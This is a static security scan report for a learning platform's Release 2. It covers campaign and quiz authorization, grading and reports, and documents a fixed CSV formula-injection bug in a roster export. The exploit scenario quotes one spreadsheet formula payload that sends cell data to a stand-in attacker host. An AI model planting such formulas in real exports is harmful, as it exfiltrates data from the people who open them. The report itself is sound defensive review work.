# Release 2 Security Scan

Scope: commits on `feat/release_2_campaigns_grading` since `main` (campaigns, quiz authoring/taking/administration, campaign and quiz reports, campaign reminders, `may_read_module` campaign branch). Static review of the backend routes, access logic, mailer, reminder job and the new frontend surface. Nothing was run dynamically.

## Findings

### 1. [MEDIUM] CSV formula injection in the module roster export — FIXED (Confidence: 0.85)

**Location:** `src/backend/app/routes/reports.py`, `get_module_report_csv`

**Vulnerability:** The Administrator roster CSV wrote the learner's display name and email verbatim. A learner sets their own name via `PATCH /api/profile/name`, so the value is attacker-controlled. The sibling campaign export (`get_campaign_report_csv`) already neutralized this with `_csv_safe`; the module export did not. Release 2 widened its reach by adding quiz attempters to the roster, so a learner who only took a quiz now appears in it too.

**Exploit scenario:**
1. A learner renames themselves `=HYPERLINK("http://evil.example/?"&A1,"open")` (or a DDE-style payload).
2. An Administrator downloads `module-{id}-report.csv` and opens it in Excel or Sheets.
3. The cell executes as a formula, which can exfiltrate roster data or prompt the Administrator to run a command.

**Fix:** `name` and `email` now go through `_csv_safe`, matching the campaign export. Regression test: `test_the_csv_export_neutralizes_spreadsheet_formulas_in_names` in `tests/test_reports.py`. This was written but **not run** in this session (no backend venv or Postgres available); please run `pytest tests/test_reports.py` before merging.

Note: the vulnerable export predates Release 2 (Release 1 ticket 9). It is fixed here because Release 2 extended it and left the two exports inconsistent.

## Reviewed, no issue found

| Area | What was checked | Result |
|---|---|---|
| Campaign authorization | Every `/api/content/campaigns/*` route goes through `_get_campaign_or_404` / `_get_managed_campaign`; non-participants get 404, collaborators get 403 on owner-only actions; individual targets are Administrator-only on create, update and removal | Consistent; no IDOR found |
| Learner access | `may_read_module` campaign branch, sequential locks (403 from viewer/page-view/quiz routes, 404 from asset delivery), suspended and closed campaigns | Single decision point is used by every learner route and by asset delivery |
| Quiz answer-key exposure | Learner payloads (`AttemptQuestion`, `AttemptView`) carry no `is_correct`; the key is revealed only after a pass and only if `reveal_after_pass`; per-question right/wrong flags after a failure are a documented product decision | No leak beyond the documented design |
| Quiz attempt IDOR | `_owned_open_attempt` returns an identical 404 for other users' and unknown attempt ids; attempts are locked `FOR UPDATE`; progress row serialized on start | No cross-user access, no double-attempt race |
| Grading trust | Server grades from the attempt's own frozen version snapshot; the request carries only option ids, validated against that question | Nothing client-forgeable |
| Rich-text injection | Quiz prompts/explanations pass through the shared ProseMirror validator (rejected, not stripped), including on import and duplicate; no `dangerouslySetInnerHTML` in new frontend files | Safe |
| Report privacy split | Content Manager campaign/quiz reports are group-level only; the roster and both CSVs are Administrator-only on separate routes | Enforced server-side |
| Campaign CSV | Uses `_csv_safe` for name, email and module titles | Safe |
| SQL / command injection | All new queries use the SQLAlchemy expression API; no raw SQL, `eval`, shell or deserialization introduced | None |
| Email | Plain-text bodies, fixed subjects; campaign name and module titles appear only in the body | No header or HTML injection |
| Erase | Quiz answers hard-deleted, submitted attempts de-identified | Correct |
| Infrastructure | Nothing under `.deploy/` changed in Release 2 | N/A |

## Observations (not vulnerabilities; no action taken)

- **Small-group deanonymization.** A Content Manager's group-level report on a group of one effectively identifies that learner's result. Inherent to counts-only reporting; a minimum-group-size threshold would be a product decision.
- **Unlimited quiz retakes.** With `max_attempts` unset, per-question right/wrong flags after each failure let a learner converge on the key. Documented design; authors who need a stronger guarantee should set an attempt cap. The 5-per-10-minutes submission limit slows but does not prevent this.
- **A Content Manager can include any module in a campaign**, making a published, non-catalog module readable by the targeted learners on activation. This matches what assignments already permit, so it is not a new privilege.
